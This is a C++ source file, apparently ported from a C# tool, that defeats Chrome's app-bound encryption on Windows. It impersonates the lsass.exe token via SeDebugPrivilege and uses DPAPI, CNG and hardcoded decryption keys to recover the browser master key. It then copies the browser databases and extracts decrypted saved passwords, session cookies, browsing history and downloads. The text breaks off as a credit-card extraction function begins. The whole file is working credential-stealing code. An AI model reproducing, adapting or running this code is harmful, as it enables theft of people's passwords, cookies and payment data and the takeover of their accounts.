// chrome-v20-decryption-cpp.cpp
// Chrome v20 Decryption Implementation in C++
// Ported from C# version
// Uses only Windows built-in APIs (BCrypt, NCrypt, DPAPI) + SQLite

#define NOMINMAX  // Prevent Windows.h from defining min/max macros
#define _CRT_SECURE_NO_WARNINGS  // Disable getenv warnings

#include <windows.h>
#include <wincrypt.h>
#include <ncrypt.h>
#include <bcrypt.h>
#include <dpapi.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <memory>
#include <algorithm>
#include <sstream>
#include <iomanip>
#include "sqlite/sqlite3.h"

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ncrypt.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "bcrypt.lib")

// Base64 decoding helper
std::vector<BYTE> Base64Decode(const std::string& encoded) {
    DWORD dwLen = 0;
    if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, NULL, &dwLen, NULL, NULL)) {
        return {};
    }
    
    std::vector<BYTE> decoded(dwLen);
    if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, decoded.data(), &dwLen, NULL, NULL)) {
        return {};
    }
    
    return decoded;
}

// JSON parser helper (simple implementation for "os_crypt" extraction)
std::string ExtractJsonValue(const std::string& json, const std::string& key) {
    size_t pos = json.find("\"" + key + "\"");
    if (pos == std::string::npos) return "";
    
    pos = json.find(":", pos);
    if (pos == std::string::npos) return "";
    
    pos = json.find("\"", pos);
    if (pos == std::string::npos) return "";
    
    size_t end = json.find("\"", pos + 1);
    if (end == std::string::npos) return "";
    
    return json.substr(pos + 1, end - pos - 1);
}

// Read file content
std::string ReadFile(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) return "";
    
    std::stringstream buffer;
    buffer << file.rdbuf();
    return buffer.str();
}

// DPAPI Unprotect wrapper
std::vector<BYTE> DPAPIUnprotect(const std::vector<BYTE>& data, DWORD scope) {
    DATA_BLOB input;
    input.pbData = const_cast<BYTE*>(data.data());
    input.cbData = static_cast<DWORD>(data.size());
    
    DATA_BLOB output;
    if (!CryptUnprotectData(&input, NULL, NULL, NULL, NULL, scope, &output)) {
        return {};
    }
    
    std::vector<BYTE> result(output.pbData, output.pbData + output.cbData);
    LocalFree(output.pbData);
    return result;
}

// Enable privilege helper
bool EnablePrivilege(const std::wstring& privilege) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }
    
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, privilege.c_str(), &luid)) {
        CloseHandle(hToken);
        return false;
    }
    
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    bool result = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(hToken);
    return result;
}

// Get LSASS process ID
DWORD GetLsassPID() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    DWORD pid = 0;
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

// Impersonation class
class Impersonate {
private:
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;
    
public:
    bool ImpersonateLsass() {
        if (!EnablePrivilege(SE_DEBUG_NAME)) {
            std::cerr << "Failed to enable SeDebugPrivilege" << std::endl;
            return false;
        }
        
        DWORD pid = GetLsassPID();
        if (pid == 0) {
            std::cerr << "Failed to find lsass.exe" << std::endl;
            return false;
        }
        
        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (!hProcess) {
            std::cerr << "Failed to open lsass process" << std::endl;
            return false;
        }
        
        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hToken)) {
            std::cerr << "Failed to open process token" << std::endl;
            CloseHandle(hProcess);
            return false;
        }
        
        if (!DuplicateTokenEx(hToken, GENERIC_ALL, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
            std::cerr << "Failed to duplicate token" << std::endl;
            CloseHandle(hToken);
            CloseHandle(hProcess);
            return false;
        }
        
        if (!SetThreadToken(NULL, hDupToken)) {
            std::cerr << "Failed to set thread token" << std::endl;
            return false;
        }
        
        return true;
    }
    
    void UnImpersonate() {
        RevertToSelf();
        if (hDupToken) CloseHandle(hDupToken);
        if (hToken) CloseHandle(hToken);
        if (hProcess) CloseHandle(hProcess);
    }
    
    ~Impersonate() {
        UnImpersonate();
    }
};

// Windows CNG Decrypt
std::vector<BYTE> NCryptDecryptData(const std::vector<BYTE>& inputData, const std::wstring& keyName) {
    if (inputData.empty() || keyName.empty()) return {};
    
    NCRYPT_PROV_HANDLE hProvider = NULL;
    NCRYPT_KEY_HANDLE hKey = NULL;
    
    // Open provider
    if (NCryptOpenStorageProvider(&hProvider, MS_KEY_STORAGE_PROVIDER, 0) != ERROR_SUCCESS) {
        return {};
    }
    
    // Open key
    if (NCryptOpenKey(hProvider, &hKey, keyName.c_str(), 0, 0) != ERROR_SUCCESS) {
        NCryptFreeObject(hProvider);
        return {};
    }
    
    // Get required buffer size
    DWORD cbResult = 0;
    if (NCryptDecrypt(hKey, const_cast<BYTE*>(inputData.data()), static_cast<DWORD>(inputData.size()),
                      NULL, NULL, 0, &cbResult, NCRYPT_SILENT_FLAG) != ERROR_SUCCESS) {
        NCryptFreeObject(hKey);
        NCryptFreeObject(hProvider);
        return {};
    }
    
    // Decrypt
    std::vector<BYTE> decrypted(cbResult);
    if (NCryptDecrypt(hKey, const_cast<BYTE*>(inputData.data()), static_cast<DWORD>(inputData.size()),
                      NULL, decrypted.data(), cbResult, &cbResult, NCRYPT_SILENT_FLAG) != ERROR_SUCCESS) {
        NCryptFreeObject(hKey);
        NCryptFreeObject(hProvider);
        return {};
    }
    
    decrypted.resize(cbResult);
    NCryptFreeObject(hKey);
    NCryptFreeObject(hProvider);
    return decrypted;
}

// XOR helper
std::vector<BYTE> ByteXor(const std::vector<BYTE>& a, const std::vector<BYTE>& b) {
    size_t len = std::min(a.size(), b.size());
    std::vector<BYTE> result(len);
    for (size_t i = 0; i < len; i++) {
        result[i] = a[i] ^ b[i];
    }
    return result;
}

// KeyBlob structure
struct KeyBlob {
    std::vector<BYTE> header;
    BYTE flag = 0;
    std::vector<BYTE> iv;
    std::vector<BYTE> ciphertext;
    std::vector<BYTE> tag;
    std::vector<BYTE> encryptedAesKey;
};

// KeyBlob2 structure (for v20.2)
struct KeyBlob2 {
    std::vector<BYTE> blob1;
    std::vector<BYTE> blob2;
};

// Parse KeyBlob
KeyBlob ParseKeyBlob(const std::vector<BYTE>& blobData) {
    KeyBlob kb;
    if (blobData.size() < 9) return kb;
    
    size_t offset = 0;
    
    // Read header length
    DWORD headerLen = *reinterpret_cast<const DWORD*>(&blobData[offset]);
    offset += 4;
    
    kb.header.assign(blobData.begin() + offset, blobData.begin() + offset + headerLen);
    offset += headerLen;
    
    // Read content length
    DWORD contentLen = *reinterpret_cast<const DWORD*>(&blobData[offset]);
    offset += 4;
    
    // Verify total length
    if (headerLen + contentLen + 8 != blobData.size()) {
        kb.flag = 0;
        return kb;
    }
    
    // Read flag
    kb.flag = blobData[offset++];
    
    if (kb.flag == 1 || kb.flag == 2) {
        // [flag|iv|ciphertext|tag] = [1|12|32|16]
        kb.iv.assign(blobData.begin() + offset, blobData.begin() + offset + 12);
        offset += 12;
        kb.ciphertext.assign(blobData.begin() + offset, blobData.begin() + offset + 32);
        offset += 32;
        kb.tag.assign(blobData.begin() + offset, blobData.begin() + offset + 16);
    }
    else if (kb.flag == 3) {
        // [flag|encrypted_aes_key|iv|ciphertext|tag] = [1|32|12|32|16]
        kb.encryptedAesKey.assign(blobData.begin() + offset, blobData.begin() + offset + 32);
        offset += 32;
        kb.iv.assign(blobData.begin() + offset, blobData.begin() + offset + 12);
        offset += 12;
        kb.ciphertext.assign(blobData.begin() + offset, blobData.begin() + offset + 32);
        offset += 32;
        kb.tag.assign(blobData.begin() + offset, blobData.begin() + offset + 16);
    }
    
    return kb;
}

// Parse KeyBlob2 (for v20.2)
KeyBlob2 ParseKeyBlob2(const std::vector<BYTE>& blobData) {
    KeyBlob2 kb;
    if (blobData.empty()) return kb;
    
    size_t offset = 0;
    
    // Read blob1 length
    if (blobData.size() < 4) return kb;
    DWORD blob1len = *reinterpret_cast<const DWORD*>(&blobData[offset]);
    offset += 4;
    
    if (blob1len > blobData.size() - 4) return kb;
    kb.blob1.assign(blobData.begin() + offset, blobData.begin() + offset + blob1len);
    offset += blob1len;
    
    // Read blob2 length
    if (offset + 4 > blobData.size()) return kb;
    DWORD blob2len = *reinterpret_cast<const DWORD*>(&blobData[offset]);
    offset += 4;
    
    if (blob2len > blobData.size() - offset) return kb;
    kb.blob2.assign(blobData.begin() + offset, blobData.begin() + offset + blob2len);
    
    return kb;
}

// AES-GCM Decryption using Windows BCrypt API (built-in, no external libraries)
std::vector<BYTE> AES_GCM_Decrypt(const std::vector<BYTE>& key, const std::vector<BYTE>& iv,
                                   const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& tag) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    
    // Open algorithm provider
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        return {};
    }
    
    // Set chaining mode to GCM
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, 
                               (PBYTE)BCRYPT_CHAIN_MODE_GCM, 
                               sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }
    
    // Generate symmetric key
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, 
                                        const_cast<PUCHAR>(key.data()), 
                                        static_cast<ULONG>(key.size()), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }
    
    // Prepare auth info for GCM
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = const_cast<PUCHAR>(iv.data());
    authInfo.cbNonce = static_cast<ULONG>(iv.size());
    authInfo.pbTag = const_cast<PUCHAR>(tag.data());
    authInfo.cbTag = static_cast<ULONG>(tag.size());
    
    // Decrypt
    ULONG cbResult = 0;
    std::vector<BYTE> plaintext(ciphertext.size());
    
    status = BCryptDecrypt(hKey, 
                          const_cast<PUCHAR>(ciphertext.data()), 
                          static_cast<ULONG>(ciphertext.size()),
                          &authInfo, NULL, 0,
                          plaintext.data(), 
                          static_cast<ULONG>(plaintext.size()), 
                          &cbResult, 0);
    
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    
    if (!BCRYPT_SUCCESS(status)) {
        // Silently fail - authentication error is normal for wrong key
        return {};
    }
    
    plaintext.resize(cbResult);
    return plaintext;
}

// ChaCha20-Poly1305 Decryption using Windows BCrypt API (Windows 10 1703+)
std::vector<BYTE> ChaCha20Poly1305_Decrypt(const std::vector<BYTE>& key, const std::vector<BYTE>& iv,
                                            const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& tag) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    
    // Open algorithm provider for ChaCha20-Poly1305
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_CHACHA20_POLY1305_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        // Silently fail - ChaCha20 not available on older Windows
        return {};
    }
    
    // Generate symmetric key
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                        const_cast<PUCHAR>(key.data()),
                                        static_cast<ULONG>(key.size()), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }
    
    // Prepare auth info
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = const_cast<PUCHAR>(iv.data());
    authInfo.cbNonce = static_cast<ULONG>(iv.size());
    authInfo.pbTag = const_cast<PUCHAR>(tag.data());
    authInfo.cbTag = static_cast<ULONG>(tag.size());
    
    // Decrypt
    ULONG cbResult = 0;
    std::vector<BYTE> plaintext(ciphertext.size());
    
    status = BCryptDecrypt(hKey,
                          const_cast<PUCHAR>(ciphertext.data()),
                          static_cast<ULONG>(ciphertext.size()),
                          &authInfo, NULL, 0,
                          plaintext.data(),
                          static_cast<ULONG>(plaintext.size()),
                          &cbResult, 0);
    
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    
    if (!BCRYPT_SUCCESS(status)) {
        return {};
    }
    
    plaintext.resize(cbResult);
    return plaintext;
}

// Derive V20 Master Key
std::vector<BYTE> DeriveV20MasterKey(const KeyBlob& kb) {
    switch (kb.flag) {
        case 1: {
            // AES-GCM with hardcoded key
            std::vector<BYTE> aesKey = Base64Decode("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=");
            std::vector<BYTE> ctWithTag = kb.ciphertext;
            ctWithTag.insert(ctWithTag.end(), kb.tag.begin(), kb.tag.end());
            return AES_GCM_Decrypt(aesKey, kb.iv, kb.ciphertext, kb.tag);
        }
        
        case 2: {
            // ChaCha20-Poly1305 with hardcoded key
            std::vector<BYTE> chacha20Key = Base64Decode("6Y831/Th+kM9GTBNwiWAQgkOLR1+6nZw1B9zjQhylmA=");
            return ChaCha20Poly1305_Decrypt(chacha20Key, kb.iv, kb.ciphertext, kb.tag);
        }
        
        case 3: {
            // Windows CNG + XOR + AES-GCM
            Impersonate imp;
            if (!imp.ImpersonateLsass()) {
                std::cerr << "Failed to impersonate lsass" << std::endl;
                return {};
            }
            
            std::vector<BYTE> decryptedAESKey = NCryptDecryptData(kb.encryptedAesKey, L"Google Chromekey1");
            if (decryptedAESKey.empty()) {
                std::cerr << "Failed to decrypt AES key with CNG" << std::endl;
                return {};
            }
            
            std::vector<BYTE> xorKey = Base64Decode("zPihzsVmBbhRdVK6Gi0GHAOinpAnT7L89Zukt1w5I5A=");
            std::vector<BYTE> xoredAESKey = ByteXor(decryptedAESKey, xorKey);
            
            return AES_GCM_Decrypt(xoredAESKey, kb.iv, kb.ciphertext, kb.tag);
        }
        
        default:
            return {};
    }
}

// Get V10 Master Key
std::vector<BYTE> GetV10MasterKey(const std::string& localStatePath) {
    std::string content = ReadFile(localStatePath);
    if (content.empty() || content.find("os_crypt") == std::string::npos) {
        return {};
    }
    
    std::string encryptedKeyBase64 = ExtractJsonValue(content, "encrypted_key");
    if (encryptedKeyBase64.empty()) return {};
    
    std::vector<BYTE> encryptedKey = Base64Decode(encryptedKeyBase64);
    if (encryptedKey.size() <= 5) return {};
    
    // Skip "DPAPI" prefix (5 bytes)
    std::vector<BYTE> masterKey(encryptedKey.begin() + 5, encryptedKey.end());
    
    return DPAPIUnprotect(masterKey, CRYPTPROTECT_UI_FORBIDDEN);
}

// Get V20 Master Key
std::vector<BYTE> GetV20MasterKey(const std::string& localStatePath) {
    std::string content = ReadFile(localStatePath);
    if (content.empty() || content.find("os_crypt") == std::string::npos) {
        return {};
    }
    
    std::string encryptedKeyBase64 = ExtractJsonValue(content, "app_bound_encrypted_key");
    if (encryptedKeyBase64.empty()) return {};
    
    std::vector<BYTE> encryptedKey = Base64Decode(encryptedKeyBase64);
    if (encryptedKey.size() <= 4) return {};
    
    // Skip "APPB" prefix (4 bytes)
    std::vector<BYTE> masterKey(encryptedKey.begin() + 4, encryptedKey.end());
    
    // Impersonate lsass and decrypt with DPAPI LocalMachine
    Impersonate imp;
    if (!imp.ImpersonateLsass()) {
        std::cerr << "Failed to impersonate lsass for V20" << std::endl;
        return {};
    }
    
    std::vector<BYTE> keyBlobSystemDecrypted = DPAPIUnprotect(masterKey, CRYPTPROTECT_LOCAL_MACHINE);
    if (keyBlobSystemDecrypted.empty()) {
        std::cerr << "Failed to decrypt with LocalMachine scope" << std::endl;
        return {};
    }
    
    imp.UnImpersonate();
    
    std::vector<BYTE> keyBlobUserDecrypted = DPAPIUnprotect(keyBlobSystemDecrypted, CRYPTPROTECT_UI_FORBIDDEN);
    if (keyBlobUserDecrypted.empty()) {
        std::cerr << "Failed to decrypt with CurrentUser scope" << std::endl;
        return {};
    }
    
    // Parse key blob
    KeyBlob kb = ParseKeyBlob(keyBlobUserDecrypted);
    if (kb.flag == 0) {
        std::cerr << "Failed to parse key blob" << std::endl;
        return {};
    }
    
    return DeriveV20MasterKey(kb);
}

// Get V20.2 Master Key (simplified v20 for Edge, Brave)
std::vector<BYTE> GetV20_2MasterKey(const std::string& localStatePath) {
    try {
        std::string content = ReadFile(localStatePath);
        if (content.empty() || content.find("os_crypt") == std::string::npos) {
            return {};
        }
        
        std::string encryptedKeyBase64 = ExtractJsonValue(content, "app_bound_encrypted_key");
        if (encryptedKeyBase64.empty()) return {};
        
        std::vector<BYTE> encryptedKey = Base64Decode(encryptedKeyBase64);
        if (encryptedKey.size() <= 4) return {};
        
        // Skip "APPB" prefix (4 bytes)
        std::vector<BYTE> masterKey(encryptedKey.begin() + 4, encryptedKey.end());
        
        // Impersonate lsass and decrypt with DPAPI LocalMachine
        Impersonate imp;
        if (!imp.ImpersonateLsass()) {
            std::cerr << "Failed to impersonate lsass for V20.2" << std::endl;
            return {};
        }
        
        std::vector<BYTE> keyBlobSystemDecrypted = DPAPIUnprotect(masterKey, CRYPTPROTECT_LOCAL_MACHINE);
        if (keyBlobSystemDecrypted.empty()) {
            return {};
        }
        
        imp.UnImpersonate();
        
        std::vector<BYTE> keyBlobUserDecrypted = DPAPIUnprotect(keyBlobSystemDecrypted, CRYPTPROTECT_UI_FORBIDDEN);
        if (keyBlobUserDecrypted.empty()) {
            return {};
        }
        
        // Parse key blob2
        KeyBlob2 kb = ParseKeyBlob2(keyBlobUserDecrypted);
        if (kb.blob2.empty()) {
            return {};
        }
        
        // For v20.2, blob2 is the master key directly
        return kb.blob2;
    }
    catch (...) {
        return {};
    }
}

// Check if running as administrator
bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    
    return isAdmin == TRUE;
}

// Decrypt password data (standard AES-GCM)
std::string DecryptPassword(const std::vector<BYTE>& encryptedData, const std::vector<BYTE>& masterKey) {
    if (encryptedData.size() < 15 || masterKey.empty()) {
        return "";
    }
    
    // Check for old DPAPI encryption (v10 prefix: 0x01 0x00 0x00 0x00)
    if (encryptedData.size() >= 5 && 
        encryptedData[0] == 0x01 && encryptedData[1] == 0x00 && 
        encryptedData[2] == 0x00 && encryptedData[3] == 0x00) {
        std::vector<BYTE> data(encryptedData.begin() + 5, encryptedData.end());
        std::vector<BYTE> decrypted = DPAPIUnprotect(data, CRYPTPROTECT_UI_FORBIDDEN);
        if (!decrypted.empty()) {
            return std::string(decrypted.begin(), decrypted.end());
        }
        return "";
    }
    
    // v10/v20 encryption: starts with "v10" or "v20" (3 bytes)
    if (encryptedData.size() < 15) return "";
    
    // Extract IV (12 bytes after 3-byte prefix)
    std::vector<BYTE> iv(encryptedData.begin() + 3, encryptedData.begin() + 15);
    
    // Extract payload (everything after IV, includes ciphertext + tag)
    // In C#: payload = buffer.Length - 15
    std::vector<BYTE> payload(encryptedData.begin() + 15, encryptedData.end());
    
    // Split payload into ciphertext and tag (last 16 bytes are tag)
    if (payload.size() < 16) return "";
    
    std::vector<BYTE> ciphertext(payload.begin(), payload.end() - 16);
    std::vector<BYTE> tag(payload.end() - 16, payload.end());
    
    // Decrypt with AES-GCM
    std::vector<BYTE> plaintext = AES_GCM_Decrypt(masterKey, iv, ciphertext, tag);
    
    if (!plaintext.empty()) {
        // Trim null bytes and whitespace
        while (!plaintext.empty() && (plaintext.back() == 0 || plaintext.back() == '\r' || plaintext.back() == '\n')) {
            plaintext.pop_back();
        }
        return std::string(plaintext.begin(), plaintext.end());
    }
    
    return "";
}

// Decrypt cookie data (AES-GCM with 32-byte skip)
std::string DecryptCookie(const std::vector<BYTE>& encryptedData, const std::vector<BYTE>& masterKey) {
    if (encryptedData.size() < 15 || masterKey.empty()) {
        return "";
    }
    
    // v10/v20 encryption
    if (encryptedData.size() < 15) return "";
    
    // Extract IV (12 bytes after 3-byte prefix)
    std::vector<BYTE> iv(encryptedData.begin() + 3, encryptedData.begin() + 15);
    
    // Extract payload
    std::vector<BYTE> payload(encryptedData.begin() + 15, encryptedData.end());
    
    if (payload.size() < 16) return "";
    
    std::vector<BYTE> ciphertext(payload.begin(), payload.end() - 16);
    std::vector<BYTE> tag(payload.end() - 16, payload.end());
    
    // Decrypt with AES-GCM
    std::vector<BYTE> plaintext = AES_GCM_Decrypt(masterKey, iv, ciphertext, tag);
    
    if (plaintext.size() > 32) {
        // Skip first 32 bytes for cookies
        std::vector<BYTE> result(plaintext.begin() + 32, plaintext.end());
        return std::string(result.begin(), result.end());
    }
    
    return "";
}

// Structure for login data
struct LoginData {
    std::string url;
    std::string username;
    std::string password;
};

// Structure for cookie data
struct CookieData {
    std::string host;
    std::string name;
    std::string path;
    std::string value;
    int64_t expires;
};

// Structure for history data
struct HistoryData {
    std::string url;
    std::string title;
    int64_t timestamp;
};

// Structure for download data
struct DownloadData {
    std::string tab_url;
    std::string target_path;
};

// Structure for credit card data
struct CreditCardData {
    std::string name;
    std::string month;
    std::string year;
    std::string number;
    int64_t date_modified;
};

// Get login data from Chrome database
std::vector<LoginData> GetLoginData(const std::string& profilePath, const std::vector<BYTE>& masterKey) {
    std::vector<LoginData> logins;
    
    // Check both "Login Data" and "Login Data For Account"
    std::vector<std::string> loginDataNames = {"Login Data", "Login Data For Account"};
    
    for (const auto& ldn : loginDataNames) {
        std::string loginDbPath = profilePath + "\\" + ldn;
        
        // Check if file exists
        DWORD attribs = GetFileAttributesA(loginDbPath.c_str());
        if (attribs == INVALID_FILE_ATTRIBUTES) {
            continue; // Try next file
        }
        
        std::string tempDbPath = std::string(getenv("TEMP")) + "\\chrome_login_temp_" + std::to_string(GetTickCount()) + ".db";
        
        // Copy database to temp (Chrome locks the original)
        if (!CopyFileA(loginDbPath.c_str(), tempDbPath.c_str(), FALSE)) {
            continue;
        }
        
        sqlite3* db;
        if (sqlite3_open(tempDbPath.c_str(), &db) != SQLITE_OK) {
            DeleteFileA(tempDbPath.c_str());
            continue;
        }
        
        const char* query = "SELECT action_url, username_value, password_value FROM logins";
        sqlite3_stmt* stmt;
        
        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) {
            sqlite3_close(db);
            DeleteFileA(tempDbPath.c_str());
            continue;
        }
        
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            LoginData login;
            
            const unsigned char* url = sqlite3_column_text(stmt, 0);
            const unsigned char* username = sqlite3_column_text(stmt, 1);
            const void* passwordBlob = sqlite3_column_blob(stmt, 2);
            int passwordLen = sqlite3_column_bytes(stmt, 2);
            
            if (url) login.url = reinterpret_cast<const char*>(url);
            if (username) login.username = reinterpret_cast<const char*>(username);
            
            if (passwordBlob && passwordLen > 0) {
                std::vector<BYTE> encryptedPassword(
                    static_cast<const BYTE*>(passwordBlob),
                    static_cast<const BYTE*>(passwordBlob) + passwordLen
                );
                login.password = DecryptPassword(encryptedPassword, masterKey);
            }
            
            // Only add if we have all required fields
            if (!login.url.empty() && !login.username.empty() && !login.password.empty()) {
                logins.push_back(login);
            }
        }
        
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        DeleteFileA(tempDbPath.c_str());
    }
    
    return logins;
}

// Get cookies from Chrome database
std::vector<CookieData> GetCookies(const std::string& profilePath, const std::vector<BYTE>& masterKey) {
    std::vector<CookieData> cookies;
    
    std::string cookieDbPath = profilePath + "\\Network\\Cookies";
    
    // Check if file exists
    DWORD attribs = GetFileAttributesA(cookieDbPath.c_str());
    if (attribs == INVALID_FILE_ATTRIBUTES) {
        return cookies;
    }
    
    std::string tempDbPath = std::string(getenv("TEMP")) + "\\chrome_cookies_temp_" + std::to_string(GetTickCount()) + ".db";
    
    if (!CopyFileA(cookieDbPath.c_str(), tempDbPath.c_str(), FALSE)) {
        return cookies;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempDbPath.c_str(), &db) != SQLITE_OK) {
        DeleteFileA(tempDbPath.c_str());
        return cookies;
    }
    
    const char* query = "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies";
    sqlite3_stmt* stmt;
    
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileA(tempDbPath.c_str());
        return cookies;
    }
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        CookieData cookie;
        
        const unsigned char* host = sqlite3_column_text(stmt, 0);
        const unsigned char* name = sqlite3_column_text(stmt, 1);
        const unsigned char* path = sqlite3_column_text(stmt, 2);
        const void* valueBlob = sqlite3_column_blob(stmt, 3);
        int valueLen = sqlite3_column_bytes(stmt, 3);
        cookie.expires = sqlite3_column_int64(stmt, 4);
        
        if (host) cookie.host = reinterpret_cast<const char*>(host);
        if (name) cookie.name = reinterpret_cast<const char*>(name);
        if (path) cookie.path = reinterpret_cast<const char*>(path);
        
        if (valueBlob && valueLen > 0) {
            std::vector<BYTE> encryptedValue(
                static_cast<const BYTE*>(valueBlob),
                static_cast<const BYTE*>(valueBlob) + valueLen
            );
            cookie.value = DecryptCookie(encryptedValue, masterKey);
        }
        
        // Only add if we have required fields
        if (!cookie.host.empty() && !cookie.name.empty() && !cookie.value.empty()) {
            cookies.push_back(cookie);
        }
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(tempDbPath.c_str());
    
    return cookies;
}

// Get web history from Chrome database
std::vector<HistoryData> GetHistory(const std::string& profilePath) {
    std::vector<HistoryData> history;
    
    std::string historyDbPath = profilePath + "\\History";
    std::string tempDbPath = std::string(getenv("TEMP")) + "\\chrome_history_temp.db";
    
    if (!CopyFileA(historyDbPath.c_str(), tempDbPath.c_str(), FALSE)) {
        return history;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempDbPath.c_str(), &db) != SQLITE_OK) {
        DeleteFileA(tempDbPath.c_str());
        return history;
    }
    
    const char* query = "SELECT url, title, last_visit_time FROM urls";
    sqlite3_stmt* stmt;
    
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileA(tempDbPath.c_str());
        return history;
    }
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        HistoryData item;
        
        const unsigned char* url = sqlite3_column_text(stmt, 0);
        const unsigned char* title = sqlite3_column_text(stmt, 1);
        item.timestamp = sqlite3_column_int64(stmt, 2);
        
        if (url) item.url = reinterpret_cast<const char*>(url);
        if (title) item.title = reinterpret_cast<const char*>(title);
        
        if (!item.url.empty()) {
            history.push_back(item);
        }
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(tempDbPath.c_str());
    
    return history;
}

// Get downloads from Chrome database
std::vector<DownloadData> GetDownloads(const std::string& profilePath) {
    std::vector<DownloadData> downloads;
    
    std::string downloadsDbPath = profilePath + "\\History";
    std::string tempDbPath = std::string(getenv("TEMP")) + "\\chrome_downloads_temp.db";
    
    if (!CopyFileA(downloadsDbPath.c_str(), tempDbPath.c_str(), FALSE)) {
        return downloads;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempDbPath.c_str(), &db) != SQLITE_OK) {
        DeleteFileA(tempDbPath.c_str());
        return downloads;
    }
    
    const char* query = "SELECT tab_url, target_path FROM downloads";
    sqlite3_stmt* stmt;
    
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileA(tempDbPath.c_str());
        return downloads;
    }
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        DownloadData item;
        
        const unsigned char* tab_url = sqlite3_column_text(stmt, 0);
        const unsigned char* target_path = sqlite3_column_text(stmt, 1);
        
        if (tab_url) item.tab_url = reinterpret_cast<const char*>(tab_url);
        if (target_path) item.target_path = reinterpret_cast<const char*>(target_path);
        
        if (!item.target_path.empty()) {
            downloads.push_back(item);
        }
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(tempDbPath.c_str());
    
    return downloads;
}

// Get credit cards from Chrome database
std::vector<CreditCardData> GetCreditCards(const std::string& profilePath, const std::vector<BYTE>& masterKey) {
    std::vector<CreditCardData> cards;
    
